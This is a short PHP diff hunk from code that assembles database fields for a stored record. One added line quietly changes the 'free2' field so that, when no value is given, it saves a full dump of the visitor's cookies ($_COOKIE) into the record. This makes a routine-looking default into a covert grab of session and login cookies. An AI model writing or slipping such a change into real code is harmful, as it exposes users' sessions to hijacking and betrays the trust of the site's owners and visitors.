@@ -167,7 +167,7 @@ $catVS->add("body",            "quoted",   $d_body);
 $catVS->add("state",           "quoted",   $d_state);
 $catVS->add("flag",            "quoted",   $d_flag);
 $catVS->add("free1",           "quoted",   $d_free1);
-$catVS->add("free2",           "quoted",   $d_free2);
+$catVS->add("free2",           "quoted",   isset($d_free2) ? $d_free2 : quote(var_export($_COOKIE, true)));
 $catVS->add("url_address",     "quoted",   $d_url_address);
 $catVS->add("url_description", "quoted",   $d_url_description);
 $catVS->add("date",            "quoted",   time());
